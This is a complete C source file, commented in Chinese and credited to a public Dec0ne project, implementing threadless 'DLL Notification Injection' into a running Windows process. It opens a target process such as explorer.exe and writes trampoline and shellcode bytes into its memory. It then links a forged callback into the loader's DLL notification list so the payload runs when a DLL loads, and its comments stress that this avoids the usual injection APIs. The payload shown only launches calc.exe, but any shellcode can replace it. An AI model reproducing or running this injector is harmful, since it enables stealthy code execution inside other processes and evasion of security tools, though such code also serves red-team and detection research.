/*
 * DLL Notification Injection - DLL 通知回调注入
 *
 * 原理：
 *   利用 Windows 内部的 LdrpDllNotificationList 双向链表，手动注册 DLL 通知回调。
 *   当目标进程加载或卸载 DLL 时，Windows 会自动调用链表中的所有回调函数，
 *   从而触发我们注入的 shellcode 执行。
 *
 * 核心技术：
 *   1. 通过 LdrRegisterDllNotification 注册虚拟回调获取 LdrpDllNotificationList 头地址
 *   2. 在远程进程中创建新的 LDR_DLL_NOTIFICATION_ENTRY
 *   3. 手动插入到远程进程的 LdrpDllNotificationList 链表中
 *   4. 修改链表的 Flink 和 Blink 指针
 *   5. 等待远程进程加载/卸载 DLL 时自动触发回调
 *   6. Trampoline shellcode 使用 TpAllocWork 创建线程池工作项执行最终 shellcode
 *   7. Restore prologue 恢复链表原始状态
 *
 * 优势：
 *   - 完全无线程（Threadless）执行
 *   - 不使用 CreateRemoteThread/QueueUserAPC/SetThreadContext
 *   - 利用 Windows 合法机制（DLL 通知回调）
 *   - 自动触发（无需手动触发）
 *   - 自动清理（恢复链表状态）
 *
 * 参考：https://github.com/Dec0ne/DllNotificationInjection
 * 作者：Dec0ne (ShorSec)
 */

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

// ============================================================================
// 数据结构定义
// ============================================================================

typedef struct _UNICODE_STR {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR pBuffer;
} UNICODE_STR, *PUNICODE_STR;

typedef struct _LDR_DLL_LOADED_NOTIFICATION_DATA {
    ULONG Flags;
    PUNICODE_STR FullDllName;
    PUNICODE_STR BaseDllName;
    PVOID DllBase;
    ULONG SizeOfImage;
} LDR_DLL_LOADED_NOTIFICATION_DATA, *PLDR_DLL_LOADED_NOTIFICATION_DATA;

typedef struct _LDR_DLL_UNLOADED_NOTIFICATION_DATA {
    ULONG Flags;
    PUNICODE_STR FullDllName;
    PUNICODE_STR BaseDllName;
    PVOID DllBase;
    ULONG SizeOfImage;
} LDR_DLL_UNLOADED_NOTIFICATION_DATA, *PLDR_DLL_UNLOADED_NOTIFICATION_DATA;

typedef union _LDR_DLL_NOTIFICATION_DATA {
    LDR_DLL_LOADED_NOTIFICATION_DATA Loaded;
    LDR_DLL_UNLOADED_NOTIFICATION_DATA Unloaded;
} LDR_DLL_NOTIFICATION_DATA, *PLDR_DLL_NOTIFICATION_DATA;

typedef VOID(CALLBACK *PLDR_DLL_NOTIFICATION_FUNCTION)(
    ULONG NotificationReason,
    PLDR_DLL_NOTIFICATION_DATA NotificationData,
    PVOID Context
);

typedef struct _LDR_DLL_NOTIFICATION_ENTRY {
    LIST_ENTRY List;
    PLDR_DLL_NOTIFICATION_FUNCTION Callback;
    PVOID Context;
} LDR_DLL_NOTIFICATION_ENTRY, *PLDR_DLL_NOTIFICATION_ENTRY;

typedef NTSTATUS (NTAPI *pLdrRegisterDllNotification)(
    ULONG Flags,
    PLDR_DLL_NOTIFICATION_FUNCTION NotificationFunction,
    PVOID Context,
    PVOID *Cookie
);

typedef NTSTATUS (NTAPI *pLdrUnregisterDllNotification)(PVOID Cookie);

// ============================================================================
// Shellcode 定义
// ============================================================================

// Calc.exe Shellcode (Sektor7)
unsigned char g_Shellcode[] = {
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x0, 0x0, 0x0, 0x41, 0x51, 0x41, 0x50, 0x52,
    0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18,
    0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0xf, 0xb7, 0x4a, 0x4a, 0x4d,
    0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x2, 0x2c, 0x20, 0x41, 0xc1,
    0xc9, 0xd, 0x41, 0x1, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20,
    0x8b, 0x42, 0x3c, 0x48, 0x1, 0xd0, 0x8b, 0x80, 0x88, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0,
    0x74, 0x67, 0x48, 0x1, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49,
    0x1, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x1, 0xd6,
    0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0xd, 0x41, 0x1, 0xc1,
    0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x3, 0x4c, 0x24, 0x8, 0x45, 0x39, 0xd1, 0x75, 0xd8,
    0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x1, 0xd0, 0x66, 0x41, 0x8b, 0xc, 0x48, 0x44,
    0x8b, 0x40, 0x1c, 0x49, 0x1, 0xd0, 0x41, 0x8b, 0x4, 0x88, 0x48, 0x1, 0xd0, 0x41,
    0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83,
    0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9,
    0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
    0x48, 0x8d, 0x8d, 0x1, 0x1, 0x0, 0x0, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5,
    0xbb, 0xe0, 0x1d, 0x2a, 0xa, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48,
    0x83, 0xc4, 0x28, 0x3c, 0x6, 0x7c, 0xa, 0x80, 0xfb, 0xe0, 0x75, 0x5, 0xbb, 0x47,
    0x13, 0x72, 0x6f, 0x6a, 0x0, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
    0x63, 0x2e, 0x65, 0x78, 0x65, 0x0
};

// Restore Prologue (恢复链表原始状态)
unsigned char g_Restore[] = {
    0x41, 0x56,                                                     // push r14
    0x49, 0xBE, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11,     // mov r14, 0x1122334455667788
    0x41, 0xC7, 0x06, 0x44, 0x33, 0x22, 0x11,                       // mov dword [r14], 0x11223344
    0x41, 0xC7, 0x46, 0x04, 0x44, 0x33, 0x22, 0x11,                 // mov dword [r14+4], 0x11223344
    0x49, 0xBE, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11,     // mov r14, 0x1122334455667788
    0x41, 0xC7, 0x06, 0x44, 0x33, 0x22, 0x11,                       // mov dword [r14], 0x11223344
    0x41, 0xC7, 0x46, 0x04, 0x44, 0x33, 0x22, 0x11,                 // mov dword [r14+4], 0x11223344
    0x41, 0x5e,                                                     // pop r14
};

// Trampoline Shellcode (创建线程池工作项)
// 来源：https://github.com/Cracked5pider/ShellcodeTemplate
unsigned char g_Trampoline[] = {
    0x56, 0x48, 0x89, 0xe6, 0x48, 0x83, 0xe4, 0xf0, 0x48, 0x83, 0xec, 0x20, 0xe8, 0xf, 0x0, 0x0,
    0x0, 0x48, 0x89, 0xf4, 0x5e, 0xc3, 0x66, 0x2e, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0,
    0x41, 0x55, 0xb9, 0xf0, 0x1d, 0xd3, 0xad, 0x41, 0x54, 0x57, 0x56, 0x53, 0x31, 0xdb, 0x48,
    0x83, 0xec, 0x30, 0xe8, 0xf9, 0x0, 0x0, 0x0, 0xb9, 0x53, 0x17, 0xe6, 0x70, 0x49, 0x89, 0xc5,
    0xe8, 0xec, 0x0, 0x0, 0x0, 0x49, 0x89, 0xc4, 0x4d, 0x85, 0xed, 0x74, 0x10, 0xba, 0xda, 0xb3,
    0xf1, 0xd, 0x4c, 0x89, 0xe9, 0xe8, 0x28, 0x1, 0x0, 0x0, 0x48, 0x89, 0xc3, 0x4d, 0x85, 0xe4,
    0x74, 0x32, 0x4c, 0x89, 0xe1, 0xba, 0x37, 0x8c, 0xc5, 0x3f, 0xe8, 0x13, 0x1, 0x0, 0x0, 0x4c,
    0x89, 0xe1, 0xba, 0xb2, 0x5a, 0x91, 0x4d, 0x48, 0x89, 0xc7, 0xe8, 0x3, 0x1, 0x0, 0x0, 0x4c,
    0x89, 0xe1, 0xba, 0x4d, 0xff, 0xa9, 0x27, 0x48, 0x89, 0xc6, 0xe8, 0xf3, 0x0, 0x0, 0x0, 0x49,
    0x89, 0xc4, 0xeb, 0x7, 0x45, 0x31, 0xe4, 0x31, 0xf6, 0x31, 0xff, 0x45, 0x31, 0xc9, 0x45, 0x31,
    0xc0, 0x48, 0x8d, 0x4c, 0x24, 0x28, 0x48, 0xba,
    0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,                 // 占位符：restore prologue 地址
    0x48, 0xc7, 0x44, 0x24, 0x28, 0x0, 0x0, 0x0, 0x0, 0xff, 0xd7, 0x48, 0x8b, 0x4c, 0x24, 0x28,
    0xff, 0xd6, 0x48, 0x8b, 0x4c, 0x24, 0x28, 0x41, 0xff, 0xd4, 0xba, 0x0, 0x10, 0x0, 0x0, 0x48,
    0x83, 0xc9, 0xff, 0xff, 0xd3, 0x48, 0x83, 0xc4, 0x30, 0x5b, 0x5e, 0x5f, 0x41, 0x5c, 0x41, 0x5d,
    0xc3, 0x49, 0x89, 0xd1, 0x49, 0x89, 0xc8, 0xba, 0x5, 0x15, 0x0, 0x0, 0x8a, 0x1, 0x4d, 0x85,
    0xc9, 0x75, 0x6, 0x84, 0xc0, 0x75, 0x16, 0xeb, 0x2f, 0x41, 0x89, 0xca, 0x45, 0x29, 0xc2, 0x4d,
    0x39, 0xca, 0x73, 0x24, 0x84, 0xc0, 0x75, 0x5, 0x48, 0xff, 0xc1, 0xeb, 0x7, 0x3c, 0x60, 0x76,
    0x3, 0x83, 0xe8, 0x20, 0x41, 0x89, 0xd2, 0xf, 0xb6, 0xc0, 0x48, 0xff, 0xc1, 0x41, 0xc1, 0xe2,
    0x5, 0x44, 0x1, 0xd0, 0x1, 0xc2, 0xeb, 0xc4, 0x89, 0xd0, 0xc3, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x57, 0x56, 0x48, 0x89, 0xce, 0x53, 0x48, 0x83, 0xec, 0x20, 0x65, 0x48, 0x8b, 0x4, 0x25,
    0x60, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x40, 0x18, 0x48, 0x8b, 0x78, 0x20, 0x48, 0x89, 0xfb, 0xf,
    0xb7, 0x53, 0x48, 0x48, 0x8b, 0x4b, 0x50, 0xe8, 0x85, 0xff, 0xff, 0xff, 0x89, 0xc0, 0x48, 0x39,
    0xf0, 0x75, 0x6, 0x48, 0x8b, 0x43, 0x20, 0xeb, 0x11, 0x48, 0x8b, 0x1b, 0x48, 0x85, 0xdb, 0x74,
    0x5, 0x48, 0x39, 0xdf, 0x75, 0xd9, 0x48, 0x83, 0xc8, 0xff, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0x5e,
    0x5f, 0xc3, 0x41, 0x57, 0x41, 0x56, 0x49, 0x89, 0xd6, 0x41, 0x55, 0x41, 0x54, 0x55, 0x31, 0xed,
    0x57, 0x56, 0x53, 0x48, 0x89, 0xcb, 0x48, 0x83, 0xec, 0x28, 0x48, 0x63, 0x41, 0x3c, 0x8b, 0xbc,
    0x8, 0x88, 0x0, 0x0, 0x0, 0x48, 0x1, 0xcf, 0x44, 0x8b, 0x7f, 0x20, 0x44, 0x8b, 0x67, 0x1c,
    0x44, 0x8b, 0x6f, 0x24, 0x49, 0x1, 0xcf, 0x39, 0x6f, 0x18, 0x76, 0x31, 0x89, 0xee, 0x31, 0xd2,
    0x41, 0x8b, 0xc, 0xb7, 0x48, 0x1, 0xd9, 0xe8, 0x15, 0xff, 0xff, 0xff, 0x4c, 0x39, 0xf0, 0x75,
    0x18, 0x48, 0x1, 0xf6, 0x48, 0x1, 0xde, 0x42, 0xf, 0xb7, 0x4, 0x2e, 0x48, 0x8d, 0x4, 0x83,
    0x42, 0x8b, 0x4, 0x20, 0x48, 0x1, 0xd8, 0xeb, 0x4, 0xff, 0xc5, 0xeb, 0xca, 0x48, 0x83, 0xc4,
    0x28, 0x5b, 0x5e, 0x5f, 0x5d, 0x41, 0x5c, 0x41, 0x5d, 0x41, 0x5e, 0x41, 0x5f, 0xc3, 0x90, 0x90,
    0x90, 0xe8, 0x0, 0x0, 0x0, 0x0, 0x58, 0x48, 0x83, 0xe8, 0x5, 0xc3, 0xf, 0x1f, 0x44, 0x0
};

// ============================================================================
// 辅助函数
// ============================================================================

/*
 * 虚拟回调函数（用于获取 LdrpDllNotificationList 头地址）
 */
VOID CALLBACK DummyCallback(ULONG NotificationReason, PLDR_DLL_NOTIFICATION_DATA NotificationData, PVOID Context) {
    return;
}

/*
 * 获取 LdrpDllNotificationList 头地址
 */
PLIST_ENTRY GetDllNotificationListHead() {
    PLIST_ENTRY head = NULL;

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("[!] 无法获取 ntdll.dll 句柄\n");
        return NULL;
    }

    pLdrRegisterDllNotification LdrRegisterDllNotification =
        (pLdrRegisterDllNotification)GetProcAddress(hNtdll, "LdrRegisterDllNotification");
    pLdrUnregisterDllNotification LdrUnregisterDllNotification =
        (pLdrUnregisterDllNotification)GetProcAddress(hNtdll, "LdrUnregisterDllNotification");

    if (!LdrRegisterDllNotification || !LdrUnregisterDllNotification) {
        printf("[!] 无法获取 LdrRegisterDllNotification/LdrUnregisterDllNotification 地址\n");
        return NULL;
    }

    // 注册虚拟回调
    PVOID cookie;
    NTSTATUS status = LdrRegisterDllNotification(0, DummyCallback, NULL, &cookie);
    if (status == 0) {
        printf("[+] 成功注册虚拟回调\n");

        // Cookie 是最后注册的回调，其 Flink 指向链表头
        head = ((PLDR_DLL_NOTIFICATION_ENTRY)cookie)->List.Flink;
        printf("[+] 找到 LdrpDllNotificationList 头地址：0x%p\n", head);

        // 注销虚拟回调
        status = LdrUnregisterDllNotification(cookie);
        if (status == 0) {
            printf("[+] 成功注销虚拟回调\n");
        }
    } else {
        printf("[!] 注册虚拟回调失败（状态码：0x%lX）\n", status);
    }

    return head;
}

/*
 * 打印远程 DLL 通知链表
 */
void PrintDllNotificationList(HANDLE hProc, LPVOID remoteHeadAddress) {
    printf("\n[*] 远程 DLL 通知链表：\n");

    BYTE *entry = (BYTE*)malloc(sizeof(LDR_DLL_NOTIFICATION_ENTRY));
    if (!entry) {
        printf("[!] 内存分配失败\n");
        return;
    }

    ReadProcessMemory(hProc, remoteHeadAddress, entry, sizeof(LDR_DLL_NOTIFICATION_ENTRY), NULL);
    LPVOID currentEntryAddress = remoteHeadAddress;

    do {
        printf("    0x%p -> 0x%p\n",
               currentEntryAddress,
               ((PLDR_DLL_NOTIFICATION_ENTRY)entry)->Callback);

        currentEntryAddress = ((PLDR_DLL_NOTIFICATION_ENTRY)entry)->List.Flink;
        ReadProcessMemory(hProc, currentEntryAddress, entry, sizeof(LDR_DLL_NOTIFICATION_ENTRY), NULL);

    } while ((PLIST_ENTRY)currentEntryAddress != remoteHeadAddress);

    free(entry);
    printf("\n");
}

/*
 * 二进制模式匹配
 */
BOOL MaskCompare(const BYTE *pData, const BYTE *bMask, const char *szMask) {
    for (; *szMask; ++szMask, ++pData, ++bMask) {
        if (*szMask == 'x' && *pData != *bMask) {
            return FALSE;
        }
    }
    return TRUE;
}

DWORD_PTR FindPattern(DWORD_PTR dwAddress, DWORD dwLen, PBYTE bMask, PCHAR szMask) {
    for (DWORD i = 0; i < dwLen; i++) {
        if (MaskCompare((PBYTE)(dwAddress + i), bMask, szMask)) {
            return (DWORD_PTR)(dwAddress + i);
        }
    }
    return 0;
}

/*
 * 查找目标进程 PID
 */
int FindTarget(const char *procname) {
    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;

    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) {
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcSnap, &pe32)) {
        CloseHandle(hProcSnap);
        return 0;
    }

    while (Process32Next(hProcSnap, &pe32)) {
        if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    }

    CloseHandle(hProcSnap);
    return pid;
}

// ============================================================================
// 主注入函数
// ============================================================================

int main(int argc, char *argv[]) {
    printf("\n======================================\n");
    printf("  DLL Notification Injection\n");
    printf("======================================\n\n");

    if (argc < 2) {
        printf("用法：%s <进程名>\n\n", argv[0]);
        printf("推荐目标进程：\n");
        printf("  - explorer.exe（资源管理器）\n");
        printf("  - RuntimeBroker.exe\n\n");
        printf("示例：\n");
        printf("  %s explorer.exe\n\n", argv[0]);
        return 1;
    }

    const char *targetProcess = argv[1];

    // 1. 获取本地 LdrpDllNotificationList 头地址
    printf("[1] 获取 LdrpDllNotificationList 头地址\n");
    LPVOID headAddress = (LPVOID)GetDllNotificationListHead();
    if (!headAddress) {
        return 1;
    }

    // 2. 打开目标进程
    printf("\n[2] 打开目标进程\n");
    int targetPID = FindTarget(targetProcess);
    if (targetPID == 0) {
        printf("[!] 未找到进程：%s\n", targetProcess);
        return 1;
    }
    printf("[+] 找到目标进程 PID：%d\n", targetPID);

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
    if (!hProc) {
        printf("[!] 无法打开进程（错误码：%lu）\n", GetLastError());
        return 1;
    }
    printf("[+] 成功打开进程\n");

    // 3. 打印远程 DLL 通知链表
    printf("\n[3] 远程 DLL 通知链表（注入前）\n");
    PrintDllNotificationList(hProc, headAddress);

    // 4. 分配内存并写入 trampoline + restore + shellcode
    printf("[4] 分配内存并写入载荷\n");
    SIZE_T totalSize = sizeof(g_Trampoline) + sizeof(g_Restore) + sizeof(g_Shellcode);
    LPVOID trampolineEx = VirtualAllocEx(hProc, NULL, totalSize,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!trampolineEx) {
        printf("[!] 内存分配失败（错误码：%lu）\n", GetLastError());
        CloseHandle(hProc);
        return 1;
    }

    LPVOID restoreEx = (BYTE*)trampolineEx + sizeof(g_Trampoline);
    LPVOID shellcodeEx = (BYTE*)restoreEx + sizeof(g_Restore);

    printf("    [+] Trampoline 地址：0x%p\n", trampolineEx);
    printf("    [+] Restore 地址：0x%p\n", restoreEx);
    printf("    [+] Shellcode 地址：0x%p\n", shellcodeEx);

    // 5. 修改 trampoline 中的 restore 地址占位符
    LPVOID restoreExInTrampoline = (LPVOID)FindPattern(
        (DWORD_PTR)g_Trampoline,
        sizeof(g_Trampoline),
        (PBYTE)"\x11\x11\x11\x11\x11\x11\x11\x11",
        (PCHAR)"xxxxxxxx"
    );

    if (restoreExInTrampoline) {
        memcpy(restoreExInTrampoline, &restoreEx, 8);
        printf("    [+] 已修改 Trampoline 中的 Restore 地址占位符\n");
    }

    // 6. 写入 trampoline 和 shellcode
    WriteProcessMemory(hProc, trampolineEx, g_Trampoline, sizeof(g_Trampoline), NULL);
    WriteProcessMemory(hProc, shellcodeEx, g_Shellcode, sizeof(g_Shellcode), NULL);
    printf("    [+] Trampoline 和 Shellcode 已写入远程进程\n");

    // 7. 创建新的 LDR_DLL_NOTIFICATION_ENTRY
    printf("\n[5] 创建新的 DLL 通知条目\n");
    LDR_DLL_NOTIFICATION_ENTRY newEntry = {0};
    newEntry.Context = NULL;
    newEntry.Callback = (PLDR_DLL_NOTIFICATION_FUNCTION)trampolineEx;
    newEntry.List.Blink = (PLIST_ENTRY)headAddress;

    // 读取远程头条目
    BYTE *remoteHeadEntry = (BYTE*)malloc(sizeof(LDR_DLL_NOTIFICATION_ENTRY));
    ReadProcessMemory(hProc, headAddress, remoteHeadEntry, sizeof(LDR_DLL_NOTIFICATION_ENTRY), NULL);
    newEntry.List.Flink = ((PLDR_DLL_NOTIFICATION_ENTRY)remoteHeadEntry)->List.Flink;

    // 分配新条目内存
    LPVOID newEntryAddress = VirtualAllocEx(hProc, NULL, sizeof(LDR_DLL_NOTIFICATION_ENTRY),
                                           MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!newEntryAddress) {
        printf("[!] 分配新条目内存失败（错误码：%lu）\n", GetLastError());
        free(remoteHeadEntry);
        CloseHandle(hProc);
        return 1;
    }

    printf("    [+] 新条目地址：0x%p\n", newEntryAddress);

    // 写入新条目
    WriteProcessMemory(hProc, newEntryAddress, &newEntry, sizeof(LDR_DLL_NOTIFICATION_ENTRY), NULL);
    printf("    [+] 新条目已写入远程进程\n");

    // 8. 准备 restore prologue
    printf("\n[6] 准备 Restore Prologue\n");
    LPVOID previousEntryFlink = (LPVOID)((BYTE*)headAddress +
                                        offsetof(LDR_DLL_NOTIFICATION_ENTRY, List) +
                                        offsetof(LIST_ENTRY, Flink));
    LPVOID nextEntryBlink = (LPVOID)((BYTE*)((PLDR_DLL_NOTIFICATION_ENTRY)remoteHeadEntry)->List.Flink +
                                    offsetof(LDR_DLL_NOTIFICATION_ENTRY, List) +
                                    offsetof(LIST_ENTRY, Blink));

    unsigned char originalValue[8] = {0};

    // 读取并保存原始值（第一个链接）
    ReadProcessMemory(hProc, previousEntryFlink, originalValue, 8, NULL);
    memcpy(&g_Restore[4], &previousEntryFlink, 8);
    memcpy(&g_Restore[15], &originalValue[0], 4);
    memcpy(&g_Restore[23], &originalValue[4], 4);

    // 读取并保存原始值（第二个链接）
    ReadProcessMemory(hProc, nextEntryBlink, originalValue, 8, NULL);
    memcpy(&g_Restore[29], &nextEntryBlink, 8);
    memcpy(&g_Restore[40], &originalValue[0], 4);
    memcpy(&g_Restore[48], &originalValue[4], 4);

    // 写入 restore prologue
    WriteProcessMemory(hProc, restoreEx, g_Restore, sizeof(g_Restore), NULL);
    printf("    [+] Restore Prologue 已写入远程进程\n");

    // 9. 修改链表指针
    printf("\n[7] 修改链表指针\n");
    WriteProcessMemory(hProc, previousEntryFlink, &newEntryAddress, 8, NULL);
    WriteProcessMemory(hProc, nextEntryBlink, &newEntryAddress, 8, NULL);
    printf("    [+] 链表已修改，新条目已插入\n");

    // 10. 打印修改后的链表
    printf("\n[8] 远程 DLL 通知链表（注入后）\n");
    PrintDllNotificationList(hProc, headAddress);

    printf("[+] DLL Notification Injection 完成！\n");
    printf("[*] 等待目标进程加载/卸载 DLL 时自动触发...\n\n");

    free(remoteHeadEntry);
    CloseHandle(hProc);
    return 0;
}
